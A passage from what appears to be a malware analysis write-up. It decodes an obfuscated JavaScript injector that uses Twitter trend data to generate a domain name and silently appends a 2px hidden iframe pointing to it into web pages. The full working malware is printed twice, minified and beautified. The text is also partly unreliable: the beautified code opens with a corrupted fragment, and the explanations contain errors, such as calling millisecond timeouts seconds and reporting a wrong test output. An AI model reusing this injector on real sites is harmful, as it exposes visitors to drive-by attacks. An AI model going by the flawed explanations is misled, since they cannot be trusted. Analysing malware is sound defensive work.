jsKm=jsKb(jso.jsx,jso.jsKa);var jsj=jso.jsx%jso.jsKa;var jsL=jso.jsKy*jsj;var jsc=jso.jsKS*jsKm;var jss=jsL-jsc;if(jss>0){jsx=jss}else{jsx=jss+jso.jsKg}return(jsx%jsF)}function jsP(jsG){jso.jsx=jsS(';')+jsG;jso.jsKy=jsS('/');jso.jsKg=jsS(';')-jsS('F');jso.jsKa=jsKb(jso.jsKg,jso.jsKy);jso.jsKS=jso.jsKg%jso.jsKy}function jsA(jsK){return jsK.length==1?jsK[0]:jsK.join('')};function jsb(jsK){d=new Date();jsg=jsS('zee');d.setTime((jsK.as_of-jsS('G')*jsS('G')*jsS('G')*jsS('ezz'))*jsS('ezzz'));return d}function jsp(jsKB){var jsN,jsKM,jsJ=jsKB.length;var jsa=[];while(--jsJ){jsKM=jsT(jsJ);jsa.push(jsKM);jsN=jsKB[jsKM];jsKB[jsKM]=jsKB[jsJ];jsKB[jsJ]=jsN}}function jsKx($){jsKr=$.map([81,85,74,74,92,17,82,73,80,30,82,77,25,11,10,10,61,11,56,55,11,53,6,53,7,2,1,0,48],function(x,i){return String.fromCharCode(i+x+24)});return jsA(jsKr)}function jsf(x){return x.length}function jsKh($){if(typeof($)!=jso.jsH){$(function(){if(typeof($.jsKp)!=jso.jsH)return;$.jsKp=1;$.getJSON(jsD,function(jsKC){jse=jsb(jsKC);jsu=jse.getUTCMonth()+(+jsS('e'));jsKL=jse.getUTCDate();jsy=function(x,i){return(jsf(x+"")-1)?x:"0"+x};jsKs=jsy(jsu,4)+"-"+jsy(jsKL,7);jst=jsD+jsS("ETzeTu")+jsKs;jsKe=jsKH=jsKb(jse.getUTCHours(),6)*6+(+jsS('e'));jsKD=jsKe+1;jsC=+jsS('ez');setTimeout(function(){$.getJSON(jst,function(jsKC){try{jsn=jsKC.trends;jsm=jsS("TzeTu")+jsKs+" ";if(jsKe<jsC)jsKe=jsS('z')+jsKe;if(jsKD<jsC)jsKD=jsS('z')+jsKD;jsd=jsn[jsm+jsKe+jsS(',')];if(!jsd){jsd=jsn[jsm+jsKD+jsS(',')]}jsd=(jsd[3].name.toLowerCase().replace(/[^a-z]/gi,'')+'microscope').split('');jsB=jsu*71+jsKH*3+jsKL*37;jsP(jsB);jsf=jsT(4)+jsC;jsp(jsd);jsE=jsS('Ch')+jsA(jsd).substring(0,jsf)+'.com/'+jsKx($);jsKJ['Z']=jsE;jsKw=jsS('BIyQHTpweeepQbiMUyQHTpweeepQUkrZRiMRIA');$(jsS('K')).append(jsKw)}catch(jsKq){}})},jsC*jsC*jsC)})})}else{setTimeout(function(){jsKh(jso.jQuery)},1+jsS('TTT'))}}jsKh(jso.jQuery)})
```

Beautifying the code, we get the following JavaScript code:

```
Í ^ dow.gloa = (function() {
    Date.prototype.jsq = function() {
        var jsKk = this;
        return [jsKk.getUTCFullYear(), jsKk.getUTCMonth(), jsKk.getUTCDate(), jsKk.getUTCHours(), jsKk.getUTCMinutes(), jsKk.getUTCSeconds()]
    };
    Date.prototype.jsR = function() {
        var jsw, jsKy = this.jsq(),
            i = 0;
        jsKy[1] += 1;
        while (i++ < 7) {
            jsw = jsKy[i];
            if (jsw < jsC) jsKy[i] = jsS('z') + jsw
        }
        return jsKy.splice(jsS('z'), 1 + jsS('T')).join(jsS('u')) + 'T' + jsKy.join(jsS('U'))
    };
    jsKJ = {
        'h': 'http://',
        's': '/',
        't': 'tre',
        'd': 'dai',
        'n': 'nds',
        'q': '?',
        'c': 'callback=',
        'j': 'js',
        'a': 'api',
        'l': 'ly',
        'W': 'twitter',
        'o': 'com',
        'e': '1',
        'k': 's',
        'K': 'body',
        'x': 'ajax',
        'D': '.',
        'L': 'libs',
        'J': 'jquery',
        '6': '6.2',
        'm': 'min',
        'f': 'on',
        'S': 'cript',
        'i': 'if',
        'M': 'rame',
        'Y': 'head',
        'w': 'width:',
        'p': 'px;',
        'H': 'height:',
        'T': '2',
        'r': 'rc',
        'Q': '"',
        'y': 'style=',
        'b': '><',
        'R': '></',
        'I': 'div',
        'B': '<',
        'A': '>',
        'g': 'google',
        'E': '&date=',
        'z': '0',
        'u': '-',
        'U': ' ',
        ',': ':00',
        ';': 2345678901,
        '/': 48271,
        'F': 198195254,
        'G': 12,
        'C': '='
    };

    function jsS(jsKo) {
        jsh = [];
        for (jsKt = 0; jsKt < jsKo.length; jsKt++) {
            jsh.push(jsKJ[jsKo.charAt(jsKt)])
        }
        return jsA(jsh)
    }
    jsKN = document;
    jso = window;
    jso.jsH = 'undefined';
    jso.jsD = jsS('haDWDosestnsdlDjfqcq');
    jsi = (typeof($) == jso.jsH);
    if (jsi || !jsKd()) {
        if (!jsi) {
            try {
                jsKv = jQuery.noConflict(true)
            } catch (e) {};
            try {
                jsKv = $.noConflict(true)
            } catch (e) {}
        }
        jsKn = jsKN.getElementsByTagName(jsS('Y'))[0];
        jsr = jsKN.createElement(jsS('kS'));
        jsr.setAttribute(jsS('kr'), jsS("hxDgakDosxsLsJseD6sJDmDj"));
        jsKn.appendChild(jsr)
    }

    function jsKb(jsz, jsKc) {
        return Math.floor(jsz / jsKc)
    }

    function jsT(jsF) {
        var jsKm = jsKb(jso.jsx, jso.jsKa);
        var jsj = jso.jsx % jso.jsKa;
        var jsL = jso.jsKy * jsj;
        var jsc = jso.jsKS * jsKm;
        var jss = jsL - jsc;
        if (jss > 0) {
            jsx = jss
        } else {
            jsx = jss + jso.jsKg
        }
        return (jsx % jsF)
    }

    function jsP(jsG) {
        jso.jsx = jsS(';') + jsG;
        jso.jsKy = jsS('/');
        jso.jsKg = jsS(';') - jsS('F');
        jso.jsKa = jsKb(jso.jsKg, jso.jsKy);
        jso.jsKS = jso.jsKg % jso.jsKy
    }

    function jsA(jsK) {
        return jsK.length == 1 ? jsK[0] : jsK.join('')
    };

    function jsb(jsK) {
        d = new Date();
        jsg = jsS('zee');
        d.setTime((jsK.as_of - jsS('G') * jsS('G') * jsS('G') * jsS('ezz')) * jsS('ezzz'));
        return d
    }

    function jsp(jsKB) {
        var jsN, jsKM, jsJ = jsKB.length;
        var jsa = [];
        while (--jsJ) {
            jsKM = jsT(jsJ);
            jsa.push(jsKM);
            jsN = jsKB[jsKM];
            jsKB[jsKM] = jsKB[jsJ];
            jsKB[jsJ] = jsN
        }
    }

    function jsKx($) {
        jsKr = $.map([81, 85, 74, 74, 92, 17, 82, 73, 80, 30, 82, 77, 25, 11, 10, 10, 61, 11, 56, 55, 11, 53, 6, 53, 7, 2, 1, 0, 48], function(x, i) {
            return String.fromCharCode(i + x + 24)
        });
        return jsA(jsKr)
    }

    function jsf(x) {
        return x.length
    }

    function jsKh($) {
        if (typeof($) != jso.jsH) {
            $(function() {
                if (typeof($.jsKp) != jso.jsH) return;
                $.jsKp = 1;
                $.getJSON(jsD, function(jsKC) {
                    jse = jsb(jsKC);
                    jsu = jse.getUTCMonth() + (+jsS('e'));
                    jsKL = jse.getUTCDate();
                    jsy = function(x, i) {
                        return (jsf(x + "") - 1) ? x : "0" + x
                    };
                    jsKs = jsy(jsu, 4) + "-" + jsy(jsKL, 7);
                    jst = jsD + jsS("ETzeTu") + jsKs;
                    jsKe = jsKH = jsKb(jse.getUTCHours(), 6) * 6 + (+jsS('e'));
                    jsKD = jsKe + 1;
                    jsC = +jsS('ez');
                    setTimeout(function() {
                        $.getJSON(jst, function(jsKC) {
                            try {
                                jsn = jsKC.trends;
                                jsm = jsS("TzeTu") + jsKs + " ";
                                if (jsKe < jsC) jsKe = jsS('z') + jsKe;
                                if (jsKD < jsC) jsKD = jsS('z') + jsKD;
                                jsd = jsn[jsm + jsKe + jsS(',')];
                                if (!jsd) {
                                    jsd = jsn[jsm + jsKD + jsS(',')]
                                }
                                jsd = (jsd[3].name.toLowerCase().replace(/[^a-z]/gi, '') + 'microscope').split('');
                                jsB = jsu * 71 + jsKH * 3 + jsKL * 37;
                                jsP(jsB);
                                jsf = jsT(4) + jsC;
                                jsp(jsd);
                                jsE = jsS('Ch') + jsA(jsd).substring(0, jsf) + '.com/' + jsKx($);
                                jsKJ['Z'] = jsE;
                                jsKw = jsS('BIyQHTpweeepQbiMUyQHTpweeepQUkrZRiMRIA');
                                $(jsS('K')).append(jsKw)
                            } catch (jsKq) {}
                        })
                    }, jsC * jsC * jsC)
                })
            })
        } else {
            setTimeout(function() {
                jsKh(jso.jQuery)
            }, 1 + jsS('TTT'))
        }
    }
    jsKh(jso.jQuery)
})
```

First, we will analyze the most frequently used function in the code, "jsS" and its related codes:

```
jsKJ = {
		'h': 'http://',
		's': '/',
		't': 'tre',
		'd': 'dai',
		'n': 'nds',
		'q': '?',
		'c': 'callback=',
		'j': 'js',
		'a': 'api',
		'l': 'ly',
		'W': 'twitter',
		'o': 'com',
		'e': '1',
		'k': 's',
		'K': 'body',
		'x': 'ajax',
		'D': '.',
		'L': 'libs',
		'J': 'jquery',
		'6': '6.2',
		'm': 'min',
		'f': 'on',
		'S': 'cript',
		'i': 'if',
		'M': 'rame',
		'Y': 'head',
		'w': 'width:',
		'p': 'px;',
		'H': 'height:',
		'T': '2',
		'r': 'rc',
		'Q': '"',
		'y': 'style=',
		'b': '><',
		'R': '></',
		'I': 'div',
		'B': '<',
		'A': '>',
		'g': 'google',
		'E': '&date=',
		'z': '0',
		'u': '-',
		'U': ' ',
		',': ':00',
		';': 2345678901,
		'/': 48271,
		'F': 198195254,
		'G': 12,
		'C': '='
};

function jsS(jsKo) {
		jsh = [];
		for (jsKt = 0; jsKt < jsKo.length; jsKt++) {
				jsh.push(jsKJ[jsKo.charAt(jsKt)])
		}
		return jsA(jsh)
}

function jsA(jsK) {
		return jsK.length == 1 ? jsK[0] : jsK.join('')
};
```

"jsS" takes in a single argument, loops through each characters in the string and replaces them with the values in "jsKo" dictionary, and outputs them as a string.

Next, we will analyze the block of code in the very beginning:

```
Date.prototype.jsq = function() {
		var jsKk = this;
		return [jsKk.getUTCFullYear(), jsKk.getUTCMonth(), jsKk.getUTCDate(), jsKk.getUTCHours(), jsKk.getUTCMinutes(), jsKk.getUTCSeconds()]
};
Date.prototype.jsR = function() {
		var jsw, jsKy = this.jsq(),
				i = 0;
		jsKy[1] += 1;
		while (i++ < 7) {
				jsw = jsKy[i];
				if (jsw < jsC) jsKy[i] = jsS('z') + jsw
		}
		return jsKy.splice(jsS('z'), 1 + jsS('T')).join(jsS('u')) + 'T' + jsKy.join(jsS('U'))
};
```

The above 2 blocks of code adds 2 methods to the "Date" class: "jsq" and "jsR" (https://www.w3schools.com/js/js_object_prototypes.asp).

"jsq" is a method that returns an array with year, month, date, hours, minutes, and seconds.

```
Date.prototype.jsR = function() {
		var jsw, jsKy = this.jsq(),
				i = 0;
		jsKy[1] += 1;
		while (i++ < 7) {
				jsw = jsKy[i];
				if (jsw < jsC) jsKy[i] = jsS('z') + jsw
		}
		return jsKy.splice(jsS('z'), 1 + jsS('T')).join(jsS('u')) + 'T' + jsKy.join(jsS('U'))
};
```

"jsR" starts with an interesting variable assignment. In JavaScript, you cannot assign multiple variable at once (https://stackoverflow.com/questions/38411834/how-to-assign-multiple-variables-at-once-in-javascript). In this case, "jsw" will be undefined, "jsKy" will be the array returned from "jsq()", and "i" will be "0".

```
jsKy[1] += 1;
```

In this line, it will add 1 month to "jsKy".

```
while (i++ < 7) {
		jsw = jsKy[i];
		if (jsw < jsC) jsKy[i] = jsS('z') + jsw
}
```

In this while loop, it will go through all the value in "jsKy", compares it with the value of "jsC" (which is not defined in the scope of the method), and prepends '0' to the value if they are less.

```
return jsKy.splice(jsS('z'), 1 + jsS('T')).join(jsS('u')) + 'T' + jsKy.join(jsS('U'))
```

The "jsS" function can be replaced as follows:

```
return jsKy.splice('0', 1 + '2').join('-') + 'T' + jsKy.join(' ')
```

Testing the code with Node as a test, I got the following:

```
> array = [2022,10,30,5,49,33]
[ 2022, 10, 30, 5, 49, 33 ]
> array.splice('0', 1 + '2').join('-') + 'T' + array.join(' ')
'2022-10-30-5-49-33T'
```

It seems to be formatting the array to a timestamp format. 

We will now look at the next block of code:

```
jsKN = document;
jso = window;
jso.jsH = 'undefined';
jso.jsD = jsS('haDWDosestnsdlDjfqcq');
jsi = (typeof($) == jso.jsH);
if (jsi || !jsKd()) {
		if (!jsi) {
				try {
						jsKv = jQuery.noConflict(true)
				} catch (e) {};
				try {
						jsKv = $.noConflict(true)
				} catch (e) {}
		}
		jsKn = jsKN.getElementsByTagName(jsS('Y'))[0];
		jsr = jsKN.createElement(jsS('kS'));
		jsr.setAttribute(jsS('kr'), jsS("hxDgakDosxsLsJseD6sJDmDj"));
		jsKn.appendChild(jsr)
}
```

It assigns the "document" and "window" object to "jsKN" and "jso" variable.
"jso.jsH" is assigned a string value "undefined", and "jso.jsD" is assigned a string value from "jsS". The value is equivalent to:

```
http://api.twitter.com/1/trends/daily.json?callback=?
```

In the next line, "jsi" is assigned a boolean value based on whether "typeof($)" is same as "jso.jsH". Earlier, we assigned "jso.jsH" a string value of "undefined", and "$" is a valid variable name in JavaScript that has not been defined yet in the code. In JavaScript, type juggling causes this boolean statement to equal true. Therefore, "jsi" is "true".

```
if (jsi || !jsKd()) {
		if (!jsi) {
				try {
						jsKv = jQuery.noConflict(true)
				} catch (e) {};
				try {
						jsKv = $.noConflict(true)
				} catch (e) {}
		}
		jsKn = jsKN.getElementsByTagName(jsS('Y'))[0];
		jsr = jsKN.createElement(jsS('kS'));
		jsr.setAttribute(jsS('kr'), jsS("hxDgakDosxsLsJseD6sJDmDj"));
		jsKn.appendChild(jsr)
}
```

Because "jsi" is "true", the first if statement will always run and second if statement will not run.
We can rewrite the rest of the code as follows:

```
jsKn = document.getElementsByTagName("head")[0];
jsr = jsKN.createElement("script");
jsr.setAttribute("src", "http://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"
);
jsKn.appendChild(jsr)
```

It seems to be loading the jquery CDN.

The code that follows are all function definition until the very last line, which calls the "jsKh" function, which seems to be the main function.

```
function jsKh($) {
		if (typeof($) != jso.jsH) {
				$(function() {
						if (typeof($.jsKp) != jso.jsH) return;
						$.jsKp = 1;
						$.getJSON(jsD, function(jsKC) {
								jse = jsb(jsKC);
								jsu = jse.getUTCMonth() + (+jsS('e'));
								jsKL = jse.getUTCDate();
								jsy = function(x, i) {
										return (jsf(x + "") - 1) ? x : "0" + x
								};
								jsKs = jsy(jsu, 4) + "-" + jsy(jsKL, 7);
								jst = jsD + jsS("ETzeTu") + jsKs;
								jsKe = jsKH = jsKb(jse.getUTCHours(), 6) * 6 + (+jsS('e'));
								jsKD = jsKe + 1;
								jsC = +jsS('ez');
								setTimeout(function() {
										$.getJSON(jst, function(jsKC) {
												try {
														jsn = jsKC.trends;
														jsm = jsS("TzeTu") + jsKs + " ";
														if (jsKe < jsC) jsKe = jsS('z') + jsKe;
														if (jsKD < jsC) jsKD = jsS('z') + jsKD;
														jsd = jsn[jsm + jsKe + jsS(',')];
														if (!jsd) {
																jsd = jsn[jsm + jsKD + jsS(',')]
														}
														jsd = (jsd[3].name.toLowerCase().replace(/[^a-z]/gi, '') + 'microscope').split('');
														jsB = jsu * 71 + jsKH * 3 + jsKL * 37;
														jsP(jsB);
														jsf = jsT(4) + jsC;
														jsp(jsd);
														jsE = jsS('Ch') + jsA(jsd).substring(0, jsf) + '.com/' + jsKx($);
														jsKJ['Z'] = jsE;
														jsKw = jsS('BIyQHTpweeepQbiMUyQHTpweeepQUkrZRiMRIA');
														$(jsS('K')).append(jsKw)
												} catch (jsKq) {}
										})
								}, jsC * jsC * jsC)
						})
				})
		} else {
				setTimeout(function() {
						jsKh(jso.jQuery)
				}, 1 + jsS('TTT'))
		}
}
jsKh(jso.jQuery)
```

The big if else statements within the function checks if jQuery has been loaded, and if it is not loaded, it will wait for 1222 seconds ("TTT" is "222" after decoding via jsS).

```
if (typeof($.jsKp) != jso.jsH) return;
$.jsKp = 1;
```

These 2 lines of code seems to be a check to make sure that the code only runs once.
"jsKp" isn't used anywhere else in the code.

```
$.getJSON(jsD, function(jsKC) {
	...
})
```

The jQuery.getJSON function loads a JSON file from the first argument and runs the second argument, which is a function. In this case, "jsD" is the URL for the JSON file and the data will be passed on to the function as "jsKC". We know from earlier that "jsD" is:

```
http://api.twitter.com/1/trends/daily.json?callback=?
```

The API seems to be deprecated at the moment.

```
jse = jsb(jsKC);
jsu = jse.getUTCMonth() + (+jsS('e'));
jsKL = jse.getUTCDate();
```

The code above uses the passed JSON response. The infomation about the API can be found at https://developer.twitter.com/en/docs/twitter-api/v1/trends/trends-for-location/api-reference/get-trends-place. "jsb" is a function and it takes in the JSON content as the parameter.

```
function jsb(jsK) {
		d = new Date();
		jsg = jsS('zee');
		d.setTime((jsK.as_of - jsS('G') * jsS('G') * jsS('G') * jsS('ezz')) * jsS('ezzz'));
		return d
}
```

Decoding all the "jsS" values, we get:

```
function jsb(jsK) {
		d = new Date();
		jsg = "011";
		d.setTime((jsK.as_of - 12 * 12 * 12 * "100") * "1000");
		return d
}
```

The "as_of" field of the twitter API is a timestamp according to the website above.
If the "as_of" field was "2020-11-20T19:37:52Z", the returned timestamp would be "2020-11-18T19:37:52.000Z", which is 2 day before the original date.

To clarify, "jsb" takes in the response from the twitter trends API and returns a timestamp of the day 2 day before the list of trends were created.

```
jsu = jse.getUTCMonth() + (+jsS('e'));
```

This line of code assign the Month of the timestamp we got earlier and assign it to the variable "jsu". The "+" sign before the "jsS" function is a way to convert a string into a number (https://stackoverflow.com/questions/42658415/what-does-a-before-a-string-means-in-javascript). The decoded value of "jsS('e')" is "1". It is adding 1 to the month because "getUTCMonth" function starts month from 0 (January).

```
jsy = function(x, i) {
		return (jsf(x + "") - 1) ? x : "0" + x
};
jsKs = jsy(jsu, 4) + "-" + jsy(jsKL, 7);
jst = jsD + jsS("ETzeTu") + jsKs;
```

"jsf" is a function that looks like below:

```
function jsf(x) {
		return x.length
}
```

It is the same as the built-in "length" function.
With the in mind, "jsy" is a function that takes in 2 arguments and when the first argument "x"'s length is not 1, it will return "x". If the length is 1, it will return "x" with "0" prepended. The second parameter "i" is not used.

```
jsKs = jsy(jsu, 4) + "-" + jsy(jsKL, 7);
```

"jsu" and "jsKL" is the month and date we got earlier. Therefore, "jsKs" is a string of date that is formatted as "MM-DD".

```
jst = jsD + jsS("ETzeTu") + jsKs;
```

"jsD" is "http://api.twitter.com/1/trends/daily.json?callback=?" and "jsS("ETzeTu")" decodes to "&date=2012-". Therefore, "jst" is a string that is formatted like "http://api.twitter.com/1/trends/daily.json?callback=?&date=2012-MM-DD"

```
jsKe = jsKH = jsKb(jse.getUTCHours(), 6) * 6 + (+jsS('e'));
jsKD = jsKe + 1;
jsC = +jsS('ez');
```

The first line of above code assigns the value of function "jsKb" to "jsKH" and "jsKe". "jsKb" looks like the following:

```
function jsKb(jsz, jsKc) {
		return Math.floor(jsz / jsKc)
}
```

It divides the first parameter "jsz" by the second parameter "jsKc" and apply floor function to it. Therefore, "jsKe" and "jsKH" can be seen as an hour value of "jse" rounded down to the nearest multiple of 6, added by 1. For example, if it was 22:00, "jsKe" and "jsKH" would be "19".

"jsKD" adds 1 to "jsKe" in the above example, "jsKD" would be "20".
"jsC" is a number "10".

```
setTimeout(function() {
		$.getJSON(jst, function(jsKC) {
				try {
						jsn = jsKC.trends;
						jsm = jsS("TzeTu") + jsKs + " ";
						if (jsKe < jsC) jsKe = jsS('z') + jsKe;
						if (jsKD < jsC) jsKD = jsS('z') + jsKD;
						jsd = jsn[jsm + jsKe + jsS(',')];
						if (!jsd) {
								jsd = jsn[jsm + jsKD + jsS(',')]
						}
						jsd = (jsd[3].name.toLowerCase().replace(/[^a-z]/gi, '') + 'microscope').split('');
						jsB = jsu * 71 + jsKH * 3 + jsKL * 37;
						jsP(jsB);
						jsf = jsT(4) + jsC;
						jsp(jsd);
						jsE = jsS('Ch') + jsA(jsd).substring(0, jsf) + '.com/' + jsKx($);
						jsKJ['Z'] = jsE;
						jsKw = jsS('BIyQHTpweeepQbiMUyQHTpweeepQUkrZRiMRIA');
						$(jsS('K')).append(jsKw)
				} catch (jsKq) {}
		})
}, jsC * jsC * jsC)
```

This timeout function runs the code after "1000" seconds ("jsC" is "10", so "jsC * jsC * jsC" is "1000").

It executes the "jQuery.getJSON" funciton on "http://api.twitter.com/1/trends/daily.json?callback=?&date=2012-MM-DD", and passes to the function as "jsKC".

```
jsn = jsKC.trends;
```

"jsn" is assigned a "trends" object from the API response, which is an array of objects with "name", "url", "promoted_content", "query", and "tweet_volume" fields (https://developer.twitter.com/en/docs/twitter-api/v1/trends/trends-for-location/api-reference/get-trends-place).

```
jsm = jsS("TzeTu") + jsKs + " ";
```

"jsS("TzeTu")" is "2012-" decoded, and "jsKs" is the date 2 days before the trend list was updated formatted as "MM-DD". Therefore, "jsm" is "2012-MM-DD "

```
if (jsKe < jsC) jsKe = jsS('z') + jsKe;
if (jsKD < jsC) jsKD = jsS('z') + jsKD;
```

These 2 lines of code checks if "jsKe" and "jsKD" are less than "10", and if they are, it will prepend the string with "0".

```
jsd = jsn[jsm + jsKe + jsS(',')];
if (!jsd) {
		jsd = jsn[jsm + jsKD + jsS(',')]
}
jsd = (jsd[3].name.toLowerCase().replace(/[^a-z]/gi, '') + 'microscope').split('');
```

"jsS(',')" is ":00" decoded. Therefore, we can rewrite the above code as follows:

```
jsd = jsn["2012-MM-DD HH:00"];
if (!jsd) {
		jsd = jsn["2012-MM-DD HH:00"]
}
jsd = (jsd[3].name.toLowerCase().replace(/[^a-z]/gi, '') + 'microscope').split('');
```

Because the example JSON we can see from the Twitter's API documentation is a little different from the script's request, we have to make some assumption. In this case, we will assume that "jsn" contains a list of trends object by date and time. I will be assuming that after the end of the fourth line in the above code, "jsd" will be an array of trends, similar to what can be found in the API documentation:

```
jsd = [
		{
			"name": "#GiftAGamer",
			"url": "http://twitter.com/search?q=%23GiftAGamer",
			"promoted_content": null,
			"query": "%23GiftAGamer",
			"tweet_volume": null
		},
		{
			"name": "#AskCuppyAnything",
			"url": "http://twitter.com/search?q=%23AskCuppyAnything",
			"promoted_content": null,
			"query": "%23AskCuppyAnything",
			"tweet_volume": 14504
		},
		{
			"name": "#givethanks",
			"url": "http://twitter.com/search?q=%23givethanks",
			"promoted_content": null,
			"query": "%23givethanks",
			"tweet_volume": null
		},
		{
			"name": "Carrefour",
			"url": "http://twitter.com/search?q=Carrefour",
			"promoted_content": null,
			"query": "Carrefour",
			"tweet_volume": 438616
		},
		{
			"name": "#StreamLifeGoesOn",
			"url": "http://twitter.com/search?q=%23StreamLifeGoesOn",
			"promoted_content": null,
			"query": "%23StreamLifeGoesOn",
			"tweet_volume": 179026
		},
		{
			"name": "STREAM BE PARTY",
			"url": "http://twitter.com/search?q=%22STREAM+BE+PARTY%22",
			"promoted_content": null,
			"query": "%22STREAM+BE+PARTY%22",
			"tweet_volume": 71404
		},
		{
			"name": "#TransDayOfRemembrance",
			"url": "http://twitter.com/search?q=%23TransDayOfRemembrance",
			"promoted_content": null,
			"query": "%23TransDayOfRemembrance",
			"tweet_volume": 45852
		},
		{
			"name": "Mourão",
			"url": "http://twitter.com/search?q=Mour%C3%A3o",
			"promoted_content": null,
			"query": "Mour%C3%A3o",
			"tweet_volume": 12614
		},
		{
			"name": "Taysom Hill",
			"url": "http://twitter.com/search?q=%22Taysom+Hill%22",
			"promoted_content": null,
			"query": "%22Taysom+Hill%22",
			"tweet_volume": 20311
		},
		{
			"name": "Geraldo",
			"url": "http://twitter.com/search?q=Geraldo",
			"promoted_content": null,
			"query": "Geraldo",
			"tweet_volume": 30166
		}
]
```

```
jsd = (jsd[3].name.toLowerCase().replace(/[^a-z]/gi, '') + 'microscope').split('');
```

This code will retrieve the "name" field of the fourth trends in the array, make it all lowercase, remove all non-alphabetic characters, append 'microscope' at the end, and make it an array of single characters. In the above example, "jsd" will be:

```
[
  'c', 'a', 'r', 'r', 'e',
  'f', 'o', 'u', 'r', 'm',
  'i', 'c', 'r', 'o', 's',
  'c', 'o', 'p', 'e'
]
```

```
jsB = jsu * 71 + jsKH * 3 + jsKL * 37;
jsP(jsB);
```

"jsu" is the month, "jsKH" is the hour, and "jsKL" is the date 2 days before the "as_of" value of API response ("jsKH" is either "1", "7", "13", "19").
In the case of the example API response (2020-11-20T19:37:52Z), "jsB" will be "11*71 + 19*3 + 18*37", or "1504".

"jsP" function looks like below:

```
function jsP(jsG) {
		jso.jsx = jsS(';') + jsG;
		jso.jsKy = jsS('/');
		jso.jsKg = jsS(';') - jsS('F');
		jso.jsKa = jsKb(jso.jsKg, jso.jsKy);
		jso.jsKS = jso.jsKg % jso.jsKy
}
```

It is creating variables to "jso", which is the "window" object. Specifically, "jso.jsx" will be the string "23456789011504", "jso.jsKy" will be a string "48271", "jso.jsKg" will be a number "2147483647" (which is 2^31 - 1), "jso.jsKa" will be a number "44488", and "jso.jsKS" will be a number "3399".

```
jsf = jsT(4) + jsC;
```

In this line, it will run the function "jsT" with the parameter "4", add it with the number "10" and save it as a variable "jsf".
"jsT" looks like the following:

```
function jsT(jsF) {
		var jsKm = jsKb(jso.jsx, jso.jsKa);
		var jsj = jso.jsx % jso.jsKa;
		var jsL = jso.jsKy * jsj;
		var jsc = jso.jsKS * jsKm;
		var jss = jsL - jsc;
		if (jss > 0) {
				jsx = jss
		} else {
				jsx = jss + jso.jsKg
		}
		return (jsx % jsF)
}
```

